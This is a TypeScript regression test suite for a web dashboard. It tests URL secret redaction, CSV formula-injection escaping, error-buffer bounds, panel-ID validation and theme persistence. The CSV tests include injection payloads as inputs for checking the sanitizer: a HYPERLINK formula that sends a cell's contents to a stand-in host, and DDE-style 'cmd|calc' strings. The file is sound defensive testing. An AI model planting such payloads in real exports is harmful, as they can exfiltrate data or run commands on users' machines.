/**
 * Regression tests for issue #8369 (browser bootstrap, config, utility defects).
 *
 * Five independent findings, each with a focused describe block so a future
 * regression points at the exact defect:
 *   1. Vercel Analytics beforeSend redacts secret/PII query params (#8369-1)
 *   2. CSV exporter neutralizes spreadsheet formulas (#8369-2)
 *   3. DebugBear RUM error buffer is bounded, snapshotted, torn down (#8369-3)
 *   4. set_panel_enabled accepts live mixed-case catalog IDs (#8369-4)
 *   5. theme-manager 'auto' preference survives explicit toggles (#8369-5)
 *
 * The dashboard entry graph pulls Vite-only APIs (import.meta.glob in
 * services/i18n), so modules that transitively import it cannot load under
 * plain node --test. The blocks below therefore import only leaf modules
 * (secondary-startup's only import is utils/after-paint; debugbear-rum and
 * panel-enablement are leaves too), while the theme-manager UI-persistence
 * contract is asserted via source invariants plus a DOM-free behavioral
 * probe of the modules that can load.
 *
 * Run: node --test tests/browser-bootstrap-defects-8369.test.mts
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  redactAnalyticsUrl,
  stripSensitiveParamsFromUrl,
  resetVercelAnalyticsForTesting,
} from '../src/bootstrap/secondary-startup.ts';
import {
  DEBUGBEAR_RUM_ERROR_QUEUE_MAX,
  initDebugBearRum,
  reportBootstrapTransferRum,
  resetDebugBearRumForTesting,
  snapshotRumError,
} from '../src/bootstrap/debugbear-rum.ts';
import {
  SET_PANEL_ENABLED_ID_PATTERN,
  evaluateSetPanelEnabled,
} from '../src/config/panel-enablement.ts';
import { getInitialPanelSettingsForVariant } from '../src/config/panels.ts';
import { csvRow, sanitizeCsvField } from '../src/utils/csv-escape.ts';

const __dirname = dirname(fileURLToPath(import.meta.url));
const root = resolve(__dirname, '..');
const themeManagerSrc = readFileSync(resolve(root, 'src/utils/theme-manager.ts'), 'utf8');
const exportSrc = readFileSync(resolve(root, 'src/utils/export.ts'), 'utf8');
const liveChannelsMainSrc = readFileSync(resolve(root, 'src/live-channels-main.ts'), 'utf8');
const liveChannelsHtmlSrc = readFileSync(resolve(root, 'live-channels.html'), 'utf8');

describe('#8369-1 Vercel Analytics URL redaction', () => {
  it('strips checkout secrets, invite tokens, referral, and Clerk params', () => {
    const redacted = redactAnalyticsUrl({
      type: 'pageview',
      url: 'https://www.worldmonitor.app/dashboard?email=a@b.com&license_key=SEKRET&subscription_id=sub_1&payment_id=pay_1&accept-business-invite=g1&token=tok123&access_token=qsecret&ref=abc&wm_referral=xyz&__clerk_handshake=h&__clerk_ticket=t&__clerk_foo=bar&checkoutProduct=pro&checkoutDiscount=SAVE&tab=news',
    });
    assert.ok(!redacted.url.includes('SEKRET'));
    assert.ok(!redacted.url.includes('tok123'));
    assert.ok(!redacted.url.includes('qsecret'));
    // Assert on PARSED params, never a substring. URLSearchParams percent-
    // encodes '@' as %40 on re-serialization, so `!includes('a@b.com')` was
    // unconditionally true the moment any other key was redacted — it could
    // not fail even with the email still present.
    const params = new URL(redacted.url).searchParams;
    assert.equal(params.get('email'), null);
    assert.equal(params.get('license_key'), null);
    assert.equal(params.get('__clerk_handshake'), null);
    assert.equal(params.get('__clerk_foo'), null);
    assert.equal(params.get('checkoutProduct'), null);
    assert.equal(params.get('subscription_id'), null);
    assert.equal(params.get('payment_id'), null);
    assert.equal(params.get('tab'), 'news', 'benign params survive');
  });

  it('keeps a redacted absolute URL absolute', () => {
    // A redacted event must have the same URL shape as an unredacted one, or
    // the collector sees a different format for exactly the events that
    // carried a secret.
    const redacted = redactAnalyticsUrl({
      type: 'pageview',
      url: 'https://www.worldmonitor.app/dashboard?token=tok123&tab=news',
    });
    assert.ok(
      redacted.url.startsWith('https://www.worldmonitor.app/'),
      `expected an absolute URL, got ${redacted.url}`,
    );
  });

  it('scrubs OAuth-style hash fragments without a ?', () => {
    const redacted = redactAnalyticsUrl({
      type: 'pageview',
      url: 'https://www.worldmonitor.app/dashboard#access_token=xyz&token_type=Bearer',
    });
    assert.ok(!redacted.url.includes('xyz'));
  });

  it('returns the original event object when nothing is sensitive', () => {
    const event = { type: 'pageview', url: 'https://www.worldmonitor.app/dashboard?tab=news' } as const;
    assert.equal(redactAnalyticsUrl(event), event);
  });

  function runBootStrip(href: string): string[] {
    const replaced: string[] = [];
    const savedWindow = Object.getOwnPropertyDescriptor(globalThis, 'window');
    Object.defineProperty(globalThis, 'window', {
      configurable: true,
      value: {
        location: { href },
        history: { replaceState: (_s: unknown, _t: string, url: string) => replaced.push(url) },
      },
    });
    try {
      stripSensitiveParamsFromUrl();
      return replaced;
    } finally {
      if (savedWindow) Object.defineProperty(globalThis, 'window', savedWindow);
      else delete (globalThis as { window?: unknown }).window;
    }
  }

  it('boot strip removes unread secrets (email, license_key)', () => {
    const replaced = runBootStrip(
      'https://www.worldmonitor.app/dashboard?email=a@b.com&license_key=SEKRET&tab=news',
    );
    assert.equal(replaced.length, 1);
    assert.ok(!replaced[0]!.includes('a@b.com'));
    assert.ok(!replaced[0]!.includes('SEKRET'));
    assert.ok(replaced[0]!.includes('tab=news'));
    resetVercelAnalyticsForTesting();
  });

  it('boot strip preserves params deferred consumers must still read', () => {
    // captureReferralFromUrl (ref/wm_referral), capturePendingCheckoutIntent
    // (checkoutProduct), the invite acceptor (accept-business-invite+token),
    // and handleCheckoutReturn (subscription_id/payment_id) all run after
    // main.ts — stripping these at boot would break attribution/resume.
    const replaced = runBootStrip(
      'https://www.worldmonitor.app/dashboard?ref=abc&checkoutProduct=pro&accept-business-invite=g1&token=tok123&subscription_id=sub_1&tab=news',
    );
    assert.equal(replaced.length, 0, 'nothing unread to strip, so no replaceState');
    resetVercelAnalyticsForTesting();
  });

  it('boot strip must NOT touch Clerk params — the SDK reads them later', () => {
    // @clerk/clerk-js loads via requestIdleCallback (scheduleClerkLoad), long
    // after this runs at main.ts module scope, and reads __clerk_status /
    // __clerk_created_session (email-link verification) and __clerk_ticket
    // (ticket sign-in/up) straight off window.location.href with no
    // dev/prod gating. Stripping them here breaks those flows in production.
    // They are still kept out of telemetry by redactAnalyticsUrl.
    const replaced = runBootStrip(
      'https://www.worldmonitor.app/?__clerk_status=verified&__clerk_created_session=sess_1&__clerk_ticket=tkt_1',
    );
    assert.equal(replaced.length, 0, 'Clerk params must survive the boot strip');
    resetVercelAnalyticsForTesting();
  });

  it('boot strip leaves a fragment-carried deferred param alone', () => {
    // The hash path must honor the caller's narrow boot list, not the broad
    // analytics list — otherwise a fragment-borne ref/checkoutProduct is
    // deleted before its deferred consumer runs.
    const replaced = runBootStrip(
      'https://www.worldmonitor.app/dashboard#/r?ref=abc&checkoutProduct=pro',
    );
    assert.equal(replaced.length, 0, 'boot list has no ref/checkoutProduct, so nothing to strip');
    resetVercelAnalyticsForTesting();
  });

  it('analytics redaction still scrubs those same fragment params', () => {
    const redacted = redactAnalyticsUrl({
      type: 'pageview',
      url: 'https://www.worldmonitor.app/dashboard#/r?ref=abc&checkoutProduct=pro&keep=1',
    });
    assert.ok(!redacted.url.includes('ref=abc'));
    assert.ok(!redacted.url.includes('checkoutProduct'));
    assert.ok(redacted.url.includes('keep=1'));
  });
});

describe('#8369-2 CSV formula neutralization', () => {
  // These call the SHIPPED sanitizeCsvField/csvRow from src/utils/csv-escape.ts.
  // They previously exercised a hand-copied inline duplicate, which meant the
  // production guard could be mutated to a no-op with the suite still green —
  // and the copy had already drifted from the original's null handling.
  // csv-escape.ts is a zero-import leaf precisely so this import works under
  // plain `node --test` (export.ts pulls services/i18n -> import.meta.glob).

  it('prefixes formula-leading fields with a single quote', () => {
    assert.equal(sanitizeCsvField('=HYPERLINK("https://evil.example/"&A1,"x")'), "'=HYPERLINK(\"https://evil.example/\"&A1,\"x\")");
    assert.equal(sanitizeCsvField('+cmd'), "'+cmd");
    assert.equal(sanitizeCsvField('-2+3'), "'-2+3");
    assert.equal(sanitizeCsvField('@mention'), "'@mention");
    assert.equal(sanitizeCsvField('\tindented'), "'\tindented");
    assert.equal(sanitizeCsvField('|DDE'), "'|DDE");
  });

  it('leaves benign fields untouched', () => {
    assert.equal(sanitizeCsvField('Reuters'), 'Reuters');
    assert.equal(sanitizeCsvField(''), '');
    assert.equal(sanitizeCsvField('price drop -5%'), 'price drop -5%');
    assert.equal(sanitizeCsvField('2 + 2 = 4'), '2 + 2 = 4');
  });

  it('handles null/undefined without throwing', () => {
    assert.equal(sanitizeCsvField(null), '');
    assert.equal(sanitizeCsvField(undefined), '');
  });

  // Regression: the leading-'-' escape must not coerce real numbers to text.
  // csvRow feeds it stringified numerics for flight/vessel Lat+Lon, market
  // Change, earthquake DepthKm and radiation Value — a western-hemisphere
  // longitude is negative, and exporting it as "'-73.98" breaks sorting,
  // charting and SUM() in Excel/Sheets.
  it('leaves negative numbers numeric', () => {
    assert.equal(sanitizeCsvField('-73.98'), '-73.98');
    assert.equal(sanitizeCsvField('-1.25'), '-1.25');
    assert.equal(sanitizeCsvField('-5'), '-5');
    assert.equal(sanitizeCsvField('-0.0001'), '-0.0001');
    assert.equal(sanitizeCsvField('-1e-7'), '-1e-7');
  });

  it('still escapes formulas that merely look numeric', () => {
    // Number() rejects each of these, so the guard must still fire.
    assert.equal(sanitizeCsvField('-2+3'), "'-2+3");
    assert.equal(sanitizeCsvField('=1+1'), "'=1+1");
    assert.equal(sanitizeCsvField('+1'), '+1'); // Number('+1') === 1, a real number
  });

  it('csvRow quotes and escapes a full row end to end', () => {
    assert.equal(
      csvRow(['Reuters "wire"', '-73.98', '=cmd|calc', '']),
      '"Reuters ""wire""","-73.98","\'=cmd|calc",""',
    );
  });
});

describe('#8369-3 DebugBear RUM bounded error buffer', () => {
  function installHarness(hostname: string) {
    const appended: Array<{ async: boolean; src: string; fetchPriority?: string; listeners: Map<string, () => void> }> = [];
    const listeners = new Map<string, (event: Event) => void>();
    const removed: string[] = [];
    const win = {
      location: { hostname },
      dbbRum: undefined as unknown[] | undefined,
      addEventListener: (type: string, cb: (event: Event) => void) => {
        listeners.set(type, cb);
      },
      removeEventListener: (type: string) => {
        listeners.delete(type);
        removed.push(type);
      },
    };
    const doc = {
      querySelector: () => null,
      createElement: () => {
        const script = {
          async: false,
          src: '',
          listeners: new Map<string, () => void>(),
          addEventListener: (type: string, cb: () => void) => {
            script.listeners.set(type, cb);
          },
        };
        return script;
      },
      head: {
        appendChild: (script: (typeof appended)[number]) => {
          appended.push(script);
          return script;
        },
      },
    };
    const saved: Record<string, PropertyDescriptor | undefined> = {
      window: Object.getOwnPropertyDescriptor(globalThis, 'window'),
      document: Object.getOwnPropertyDescriptor(globalThis, 'document'),
    };
    Object.defineProperty(globalThis, 'window', { configurable: true, value: win });
    Object.defineProperty(globalThis, 'document', { configurable: true, value: doc });
    const savedRandom = Math.random;
    Math.random = () => 0;
    return {
      appended,
      listeners,
      removed,
      win,
      restore: () => {
        for (const [key, desc] of Object.entries(saved)) {
          if (desc) Object.defineProperty(globalThis, key, desc);
          else delete (globalThis as Record<string, unknown>)[key];
        }
        Math.random = savedRandom;
        resetDebugBearRumForTesting();
      },
    };
  }

  it('snapshots primitives instead of retaining live Event objects', () => {
    const h = installHarness('www.worldmonitor.app');
    try {
      initDebugBearRum();
      const live = { type: 'error', message: 'boom', filename: 'a.js', lineno: 1, colno: 2, timeStamp: 42 } as unknown as Event;
      h.listeners.get('error')!(live);
      const queued = (h.win.dbbRum as unknown[][])[1]!;
      assert.equal(queued[0], 'error');
      // `reason` is absent (not '') and `timeStamp` is present: both are
      // required by the collector's decoder — see snapshotRumError.
      assert.deepEqual(queued[1], {
        type: 'error',
        timeStamp: 42,
        message: 'boom',
        filename: 'a.js',
        lineno: 1,
        colno: 2,
      });
      assert.notEqual(queued[1], live);
    } finally {
      h.restore();
    }
  });

  it('drop-oldest bounds the vendor queue under a noisy error loop', () => {
    assert.equal(DEBUGBEAR_RUM_ERROR_QUEUE_MAX, 50);
    const h = installHarness('www.worldmonitor.app');
    try {
      initDebugBearRum();
      reportBootstrapTransferRum({
        tier: 'fast',
        outcome: 'complete',
        duration_ms: 125,
        decoded_bytes: 1_000,
        encoded_bytes: 500,
        device_class: 'desktop',
      });
      for (let i = 0; i < DEBUGBEAR_RUM_ERROR_QUEUE_MAX + 10; i++) {
        h.listeners.get('error')!({ type: 'error', message: `e${i}` } as unknown as Event);
      }
      const queue = h.win.dbbRum as unknown[][];
      assert.equal(queue.length, DEBUGBEAR_RUM_ERROR_QUEUE_MAX);
      assert.deepEqual(queue[0]![0], 'presampling');
      assert.ok(queue.some(([kind]) => kind === 'metric1'), 'bootstrap metrics survive saturation');
      assert.ok(queue.some(([kind]) => kind === 'tag3'), 'bootstrap tags survive saturation');
      const messages = queue
        .filter(([kind]) => kind === 'error')
        .map(([, value]) => (value as { message: string }).message);
      assert.ok(!messages.includes('e0'), 'the oldest error is evicted first');
      assert.ok(messages.includes(`e${DEBUGBEAR_RUM_ERROR_QUEUE_MAX + 9}`), 'the newest error is retained');
    } finally {
      h.restore();
    }
  });

  it('detaches listeners on vendor script load and on load failure', () => {
    const h = installHarness('www.worldmonitor.app');
    try {
      initDebugBearRum();
      assert.ok(h.listeners.has('error'));
      h.appended[0]!.listeners.get('load')!();
      assert.ok(!h.listeners.has('error'), 'listeners detach on load');
      assert.ok(!h.listeners.has('unhandledrejection'));
      assert.deepEqual(h.removed.sort(), ['error', 'unhandledrejection']);
    } finally {
      h.restore();
    }

    const h2 = installHarness('www.worldmonitor.app');
    try {
      initDebugBearRum();
      h2.appended[0]!.listeners.get('error')!();
      assert.ok(!h2.listeners.has('error'), 'listeners detach on load failure');
    } finally {
      h2.restore();
    }
  });

  it('snapshotRumError never retains object references', () => {
    const domNode = { nodeName: 'DIV' };
    const snap = snapshotRumError({ type: 'unhandledrejection', reason: domNode } as unknown as Event);
    // The previous assertion was `!reason.includes('nodeName') || length <= 500`,
    // whose second disjunct is unconditionally true because snapshotRumError
    // always slices to 500 — it would have passed on a live DOM node.
    assert.equal(snap.reason, '[object Object]');
    assert.notStrictEqual(snap.reason as unknown, domNode);
  });

  it('truncates an oversized rejection reason to 500 chars', () => {
    const snap = snapshotRumError(
      { type: 'unhandledrejection', reason: 'x'.repeat(600) } as unknown as Event,
    );
    assert.equal(snap.reason?.length, 500);
  });

  // The collector decodes a queued entry as a duck-typed Event. These pin the
  // two fields its mapper reads that a plain-object snapshot can silently
  // lose — verified against cdn.debugbear.com's shipped bundle, whose
  // message resolution is
  //   e = (t instanceof ErrorEvent) ? t.error : t.reason
  //   e == null ? ('message' in t ? t.message : 'Message unknown') : String(e)
  // so a PRESENT reason (even '') shadows message, and timeStamp is read
  // unconditionally via Math.round(t.timeStamp).
  it('omits reason for a plain error so the decoder falls through to message', () => {
    const snap = snapshotRumError(
      { type: 'error', message: 'boom', filename: 'a.js', lineno: 1, colno: 2, timeStamp: 123 } as unknown as Event,
    );
    assert.equal(snap.reason, undefined, 'a present reason would shadow message at the collector');
    assert.equal(snap.message, 'boom');
    assert.equal(snap.timeStamp, 123, 'absent timeStamp decodes to NaN -> null');

    // Replay the collector's own message resolution over the snapshot.
    const t = snap as unknown as Record<string, unknown>;
    const e = t['reason'];
    const decodedMessage = e == null
      ? ('message' in t ? t['message'] : 'Message unknown')
      : String(e);
    assert.equal(decodedMessage, 'boom');
    assert.equal(Number.isFinite(Math.round(snap.timeStamp)), true);
  });

  it('keeps reason for a genuine rejection', () => {
    const snap = snapshotRumError(
      { type: 'unhandledrejection', reason: 'nope', timeStamp: 7 } as unknown as Event,
    );
    assert.equal(snap.reason, 'nope');
    assert.equal(snap.timeStamp, 7);
  });
});

describe('#8369-4 set_panel_enabled mixed-case catalog IDs', () => {
  it('accepts gccNews and regionalStartups as stable IDs', () => {
    assert.ok(SET_PANEL_ENABLED_ID_PATTERN.test('gccNews'));
    assert.ok(SET_PANEL_ENABLED_ID_PATTERN.test('regionalStartups'));
  });

  it('toggles gccNews when native to the finance variant', () => {
    const panelSettings = structuredClone(getInitialPanelSettingsForVariant('finance'));
    panelSettings['gccNews'] = { ...panelSettings['gccNews']!, enabled: false };
    const result = evaluateSetPanelEnabled({
      panelId: 'gccNews',
      enabled: true,
      panelSettings,
      variant: 'finance',
      isPro: true,
    });
    assert.equal(result.ok, true);
    assert.equal(result.status, 'applied');
    assert.equal(result.changed, true);
  });

  it('schema-valid-but-unknown mixed-case IDs reach catalog checks', () => {
    const panelSettings = structuredClone(getInitialPanelSettingsForVariant('full'));
    for (const panelId of ['GccNews', 'Markets']) {
      const result = evaluateSetPanelEnabled({
        panelId,
        enabled: true,
        panelSettings,
        variant: 'full',
        isPro: true,
      });
      assert.equal(result.reason, 'unknown_panel', panelId);
    }
  });
});

describe('#8369-5 theme-manager auto preference persistence', () => {
  // Behavioral, not source-text. The previous block asserted regexes over the
  // file (one matched only a code COMMENT's wording), and its slice anchor
  // `indexOf('export function setTheme')` is a prefix of
  // `export function setThemePreference` -- both resolve to the same offset,
  // so it inspected the wrong function entirely. theme-manager's only import
  // is ./theme-colors (a zero-import leaf), so it loads here with a stub DOM.

  type MediaListener = () => void;

  function installThemeHarness(opts: { stored?: string | null; prefersLight?: boolean; variant?: string } = {}) {
    const store = new Map<string, string>();
    if (opts.stored != null) store.set('worldmonitor-theme', opts.stored);
    const listeners = new Map<string, Set<MediaListener>>();
    let prefersLight = opts.prefersLight ?? false;
    const dataset: Record<string, string | undefined> = {};
    if (opts.variant) dataset['variant'] = opts.variant;
    const dispatched: string[] = [];

    const mql = {
      get matches() { return prefersLight; },
      addEventListener: (type: string, cb: MediaListener) => {
        if (!listeners.has(type)) listeners.set(type, new Set());
        listeners.get(type)!.add(cb);
      },
      removeEventListener: (type: string, cb: MediaListener) => {
        listeners.get(type)?.delete(cb);
      },
    };

    const saved: Record<string, PropertyDescriptor | undefined> = {
      window: Object.getOwnPropertyDescriptor(globalThis, 'window'),
      document: Object.getOwnPropertyDescriptor(globalThis, 'document'),
      localStorage: Object.getOwnPropertyDescriptor(globalThis, 'localStorage'),
      CustomEvent: Object.getOwnPropertyDescriptor(globalThis, 'CustomEvent'),
    };
    const storage = {
      getItem: (k: string) => (store.has(k) ? store.get(k)! : null),
      setItem: (k: string, v: string) => { store.set(k, v); },
      removeItem: (k: string) => { store.delete(k); },
    };
    class FakeCustomEvent { type: string; detail: unknown;
      constructor(type: string, init?: { detail?: unknown }) { this.type = type; this.detail = init?.detail; } }
    const win = {
      matchMedia: () => mql,
      dispatchEvent: (e: { type: string }) => { dispatched.push(e.type); return true; },
      localStorage: storage,
    };
    const doc = {
      documentElement: { dataset },
      querySelector: () => null,
    };
    Object.defineProperty(globalThis, 'window', { configurable: true, value: win });
    Object.defineProperty(globalThis, 'document', { configurable: true, value: doc });
    Object.defineProperty(globalThis, 'localStorage', { configurable: true, value: storage });
    Object.defineProperty(globalThis, 'CustomEvent', { configurable: true, value: FakeCustomEvent });

    return {
      dataset,
      dispatched,
      stored: () => store.get('worldmonitor-theme') ?? null,
      listenerCount: () => listeners.get('change')?.size ?? 0,
      fireOsChange: (light: boolean) => {
        prefersLight = light;
        for (const cb of listeners.get('change') ?? []) cb();
      },
      restore: () => {
        for (const [k, d] of Object.entries(saved)) {
          if (d) Object.defineProperty(globalThis, k, d);
          else delete (globalThis as Record<string, unknown>)[k];
        }
      },
    };
  }

  async function loadThemeManager() {
    // Cache-bust so each test gets fresh module-level listener state.
    return import(`../src/utils/theme-manager.ts?t=${Date.now()}${Math.random()}`);
  }

  it('setThemePreference persists the raw choice, not its resolved value', async () => {
    const h = installThemeHarness({ prefersLight: true });
    try {
      const tm = await loadThemeManager();
      tm.setThemePreference('auto');
      assert.equal(h.stored(), 'auto', "'auto' must never be stored as its resolved theme");
      assert.equal(h.dataset['theme'], 'light', 'auto resolves to the OS scheme');
      tm.setThemePreference('dark');
      assert.equal(h.stored(), 'dark');
      assert.equal(h.dataset['theme'], 'dark');
    } finally { h.restore(); }
  });

  it("an explicit toggle after 'auto' replaces the preference and detaches the listener", async () => {
    const h = installThemeHarness({ prefersLight: true });
    try {
      const tm = await loadThemeManager();
      tm.setThemePreference('auto');
      assert.equal(h.listenerCount(), 1, 'auto attaches exactly one matchMedia listener');
      tm.setThemePreference('dark');
      assert.equal(h.stored(), 'dark');
      assert.equal(h.listenerCount(), 0, 'an explicit pick must detach the auto listener');
      h.fireOsChange(true);
      assert.equal(h.dataset['theme'], 'dark', 'OS changes must not override an explicit pick');
    } finally { h.restore(); }
  });

  it("re-selecting 'auto' does not accumulate listeners", async () => {
    const h = installThemeHarness();
    try {
      const tm = await loadThemeManager();
      tm.setThemePreference('auto');
      tm.setThemePreference('auto');
      tm.setThemePreference('auto');
      assert.equal(h.listenerCount(), 1);
    } finally { h.restore(); }
  });

  it("applyStoredTheme restores the auto listener after reload and follows the OS", async () => {
    const h = installThemeHarness({ stored: 'auto', prefersLight: false });
    try {
      const tm = await loadThemeManager();
      tm.applyStoredTheme();
      assert.equal(h.dataset['theme'], 'dark');
      assert.equal(h.listenerCount(), 1, 'a stored auto must re-attach on boot');
      h.fireOsChange(true);
      assert.equal(h.dataset['theme'], 'light', 'the restored listener must repaint');
      assert.equal(h.stored(), 'auto', 'following the OS must not clobber the preference');
    } finally { h.restore(); }
  });

  it('an implicit-auto user (nothing stored) also follows the OS', async () => {
    const h = installThemeHarness({ stored: null, prefersLight: false });
    try {
      const tm = await loadThemeManager();
      assert.equal(tm.getThemePreference(), 'auto', 'settings UI shows Auto preselected');
      tm.applyStoredTheme();
      assert.equal(h.listenerCount(), 1, 'implicit auto must behave like explicit auto');
      h.fireOsChange(true);
      assert.equal(h.dataset['theme'], 'light');
      assert.equal(h.stored(), null, 'following the OS must not create a preference');
    } finally { h.restore(); }
  });

  it('happy pins light and does not attach an OS listener', async () => {
    const h = installThemeHarness({ stored: null, prefersLight: false, variant: 'happy' });
    try {
      const tm = await loadThemeManager();
      tm.applyStoredTheme();
      assert.equal(h.dataset['theme'], 'light');
      assert.equal(h.listenerCount(), 0);
    } finally { h.restore(); }
  });

  it('exposes no setTheme escape hatch that silently skips persistence', async () => {
    const tm = await loadThemeManager();
    assert.equal(
      (tm as Record<string, unknown>)['setTheme'],
      undefined,
      'setTheme used to persist; a same-name non-persisting export would reintroduce the bug',
    );
  });

  it('explicit UI toggles route through setThemePreference', () => {
    const mobileNav = readFileSync(resolve(root, 'src/app/mobile-primary-nav.ts'), 'utf8');
    const searchManager = readFileSync(resolve(root, 'src/app/search-manager.ts'), 'utf8');
    assert.match(mobileNav, /setThemePreference\(next\)/);
    assert.doesNotMatch(mobileNav, /[^a-zA-Z]setTheme\(next\)/);
    assert.match(searchManager, /setTheme: \(theme: 'dark' \| 'light'\) => setThemePreference\(theme\)/);
  });

  it('standalone channel management resolves stored auto before its first async work', () => {
    const applyIndex = liveChannelsMainSrc.indexOf('applyStoredTheme();');
    const i18nIndex = liveChannelsMainSrc.indexOf('await initI18n(');
    assert.ok(applyIndex >= 0, 'standalone entry applies the shared stored preference');
    assert.ok(i18nIndex > applyIndex, 'theme is applied before waiting for translations');
    assert.match(liveChannelsHtmlSrc, /t==='auto'/, 'prepaint recognizes the stored auto value');
    assert.match(
      liveChannelsHtmlSrc,
      /prefers-color-scheme: light/,
      'prepaint resolves auto against the OS before module startup',
    );
  });
});
